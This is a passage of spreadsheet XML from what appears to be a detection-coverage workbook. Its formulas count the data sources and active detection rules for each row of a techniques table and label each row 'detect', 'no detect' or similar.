        <f t="array" ref="M75">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N75" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O75" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P75" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S7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75" t="s">
        <v>368</v>
      </c>
      <c r="U75" t="s">
        <v>675</v>
      </c>
      <c r="V75" t="s">
        <v>676</v>
      </c>
      <c r="W75" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="76" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A76" t="s">
        <v>677</v>
      </c>
      <c r="B76" t="s">
        <v>677</v>
      </c>
      <c r="C76" t="s">
        <v>137</v>
      </c>
      <c r="D76" t="s">
        <v>678</v>
      </c>
      <c r="E76" t="s">
        <v>463</v>
      </c>
      <c r="F76" s="9">
        <f t="shared" si="1"/>
        <v>2</v>
      </c>
      <c r="G76" s="9" cm="1">
        <f t="array" ref="G76">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H76" s="9" cm="1">
        <f t="array" ref="H76">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I76" s="9" t="str" cm="1">
        <f t="array" ref="I76">IF(SUM(IF($C76=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C76=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J76" s="9" t="str" cm="1">
        <f t="array" ref="J7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76" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M76" s="9" cm="1">
        <f t="array" ref="M76">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N76" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O76" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P76" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S7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76" t="s">
        <v>679</v>
      </c>
      <c r="U76" t="s">
        <v>680</v>
      </c>
      <c r="V76" t="s">
        <v>681</v>
      </c>
      <c r="W76" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="77" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A77" t="s">
        <v>682</v>
      </c>
      <c r="B77" t="s">
        <v>682</v>
      </c>
      <c r="C77" t="s">
        <v>61</v>
      </c>
      <c r="D77" t="s">
        <v>12</v>
      </c>
      <c r="E77" t="s">
        <v>444</v>
      </c>
      <c r="F77" s="9">
        <f t="shared" si="1"/>
        <v>5</v>
      </c>
      <c r="G77" s="9" cm="1">
        <f t="array" ref="G77">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>4</v>
      </c>
      <c r="H77" s="9" cm="1">
        <f t="array" ref="H77">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I77" s="9" t="str" cm="1">
        <f t="array" ref="I77">IF(SUM(IF($C77=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C77=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J77" s="9" t="str" cm="1">
        <f t="array" ref="J7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77" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M77" s="9" cm="1">
        <f t="array" ref="M77">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N77" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O77" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P77" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S7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77" t="s">
        <v>368</v>
      </c>
      <c r="U77" t="s">
        <v>683</v>
      </c>
      <c r="V77" t="s">
        <v>370</v>
      </c>
      <c r="W77" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="78" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A78" t="s">
        <v>684</v>
      </c>
      <c r="B78" t="s">
        <v>684</v>
      </c>
      <c r="C78" t="s">
        <v>168</v>
      </c>
      <c r="D78" t="s">
        <v>8</v>
      </c>
      <c r="E78" t="s">
        <v>685</v>
      </c>
      <c r="F78" s="9">
        <f t="shared" si="1"/>
        <v>3</v>
      </c>
      <c r="G78" s="9" cm="1">
        <f t="array" ref="G78">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H78" s="9" cm="1">
        <f t="array" ref="H78">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I78" s="9" t="str" cm="1">
        <f t="array" ref="I78">IF(SUM(IF($C78=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C78=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J78" s="9" t="str" cm="1">
        <f t="array" ref="J7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78" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M78" s="9" cm="1">
        <f t="array" ref="M78">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N78" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O78" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P78" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S7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78" t="s">
        <v>686</v>
      </c>
      <c r="U78" t="s">
        <v>687</v>
      </c>
      <c r="V78" t="s">
        <v>688</v>
      </c>
      <c r="W78" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="79" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A79" t="s">
        <v>689</v>
      </c>
      <c r="B79" t="s">
        <v>689</v>
      </c>
      <c r="C79" t="s">
        <v>158</v>
      </c>
      <c r="D79" t="s">
        <v>3</v>
      </c>
      <c r="E79" t="s">
        <v>690</v>
      </c>
      <c r="F79" s="9">
        <f t="shared" si="1"/>
        <v>4</v>
      </c>
      <c r="G79" s="9" cm="1">
        <f t="array" ref="G79">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H79" s="9" cm="1">
        <f t="array" ref="H79">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I79" s="9" t="str" cm="1">
        <f t="array" ref="I79">IF(SUM(IF($C79=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C79=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J79" s="9" t="str" cm="1">
        <f t="array" ref="J7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79" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M79" s="9" cm="1">
        <f t="array" ref="M79">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N79" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O79" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P79" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S7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79" t="s">
        <v>386</v>
      </c>
      <c r="U79" t="s">
        <v>691</v>
      </c>
      <c r="V79" t="s">
        <v>692</v>
      </c>
      <c r="W79" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="80" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A80" t="s">
        <v>693</v>
      </c>
      <c r="B80" t="s">
        <v>693</v>
      </c>
      <c r="C80" t="s">
        <v>48</v>
      </c>
      <c r="D80" t="s">
        <v>12</v>
      </c>
      <c r="E80" t="s">
        <v>694</v>
      </c>
      <c r="F80" s="9">
        <f t="shared" si="1"/>
        <v>7</v>
      </c>
      <c r="G80" s="9" cm="1">
        <f t="array" ref="G80">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>4</v>
      </c>
      <c r="H80" s="9" cm="1">
        <f t="array" ref="H80">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>3</v>
      </c>
      <c r="I80" s="9" t="str" cm="1">
        <f t="array" ref="I80">IF(SUM(IF($C80=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C80=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J80" s="9" cm="1">
        <f t="array" ref="J8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80" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>3</v>
      </c>
      <c r="M80" s="9" cm="1">
        <f t="array" ref="M80">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>3</v>
      </c>
      <c r="N80" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O80" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P80" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S8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80" t="s">
        <v>695</v>
      </c>
      <c r="U80" t="s">
        <v>696</v>
      </c>
      <c r="V80" t="s">
        <v>370</v>
      </c>
      <c r="W80" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="81" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A81" t="s">
        <v>693</v>
      </c>
      <c r="B81" t="s">
        <v>697</v>
      </c>
      <c r="C81" t="s">
        <v>698</v>
      </c>
      <c r="D81" t="s">
        <v>12</v>
      </c>
      <c r="E81" t="s">
        <v>444</v>
      </c>
      <c r="F81" s="9">
        <f t="shared" si="1"/>
        <v>5</v>
      </c>
      <c r="G81" s="9" cm="1">
        <f t="array" ref="G81">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>4</v>
      </c>
      <c r="H81" s="9" t="str" cm="1">
        <f t="array" ref="H81">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I81" s="9" t="str" cm="1">
        <f t="array" ref="I81">IF(SUM(IF($C81=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C81=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J81" s="9" t="str" cm="1">
        <f t="array" ref="J8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81" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M81" s="9" cm="1">
        <f t="array" ref="M81">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N81" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O81" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P81" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S8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81" t="s">
        <v>368</v>
      </c>
      <c r="U81" t="s">
        <v>699</v>
      </c>
      <c r="V81" t="s">
        <v>700</v>
      </c>
      <c r="W81" t="b">
        <v>1</v>
      </c>
      <c r="X81" t="s">
        <v>693</v>
      </c>
    </row>
    <row r="82" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A82" t="s">
        <v>693</v>
      </c>
      <c r="B82" t="s">
        <v>701</v>
      </c>
      <c r="C82" t="s">
        <v>702</v>
      </c>
      <c r="D82" t="s">
        <v>12</v>
      </c>
      <c r="E82" t="s">
        <v>444</v>
      </c>
      <c r="F82" s="9">
        <f t="shared" si="1"/>
        <v>5</v>
      </c>
      <c r="G82" s="9" cm="1">
        <f t="array" ref="G82">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>4</v>
      </c>
      <c r="H82" s="9" t="str" cm="1">
        <f t="array" ref="H82">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I82" s="9" t="str" cm="1">
        <f t="array" ref="I82">IF(SUM(IF($C82=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C82=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J82" s="9" t="str" cm="1">
        <f t="array" ref="J8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82" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M82" s="9" cm="1">
        <f t="array" ref="M82">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N82" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O82" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P82" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S8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82" t="s">
        <v>368</v>
      </c>
      <c r="U82" t="s">
        <v>703</v>
      </c>
      <c r="V82" t="s">
        <v>704</v>
      </c>
      <c r="W82" t="b">
        <v>1</v>
      </c>
      <c r="X82" t="s">
        <v>693</v>
      </c>
    </row>
    <row r="83" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A83" t="s">
        <v>693</v>
      </c>
      <c r="B83" t="s">
        <v>705</v>
      </c>
      <c r="C83" t="s">
        <v>323</v>
      </c>
      <c r="D83" t="s">
        <v>12</v>
      </c>
      <c r="E83" t="s">
        <v>444</v>
      </c>
      <c r="F83" s="9">
        <f t="shared" si="1"/>
        <v>5</v>
      </c>
      <c r="G83" s="9" cm="1">
        <f t="array" ref="G83">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>4</v>
      </c>
      <c r="H83" s="9" t="str" cm="1">
        <f t="array" ref="H83">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I83" s="9" t="str" cm="1">
        <f t="array" ref="I83">IF(SUM(IF($C83=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C83=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J83" s="9" t="str" cm="1">
        <f t="array" ref="J8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83" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M83" s="9" cm="1">
        <f t="array" ref="M83">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N83" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O83" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P83" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S8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83" t="s">
        <v>425</v>
      </c>
      <c r="U83" t="s">
        <v>706</v>
      </c>
      <c r="V83" t="s">
        <v>707</v>
      </c>
      <c r="W83" t="b">
        <v>1</v>
      </c>
      <c r="X83" t="s">
        <v>693</v>
      </c>
    </row>
    <row r="84" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A84" t="s">
        <v>708</v>
      </c>
      <c r="B84" t="s">
        <v>708</v>
      </c>
      <c r="C84" t="s">
        <v>201</v>
      </c>
      <c r="D84" t="s">
        <v>8</v>
      </c>
      <c r="E84" t="s">
        <v>434</v>
      </c>
      <c r="F84" s="9">
        <f t="shared" si="1"/>
        <v>3</v>
      </c>
      <c r="G84" s="9" cm="1">
        <f t="array" ref="G84">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H84" s="9" cm="1">
        <f t="array" ref="H84">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I84" s="9" t="str" cm="1">
        <f t="array" ref="I84">IF(SUM(IF($C84=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C84=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J84" s="9" t="str" cm="1">
        <f t="array" ref="J8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84" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M84" s="9" cm="1">
        <f t="array" ref="M84">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N84" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O84" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P84" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S8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84" t="s">
        <v>679</v>
      </c>
      <c r="U84" t="s">
        <v>709</v>
      </c>
      <c r="V84" t="s">
        <v>710</v>
      </c>
      <c r="W84" t="b">
        <v>0</v>
      </c>
    </row>
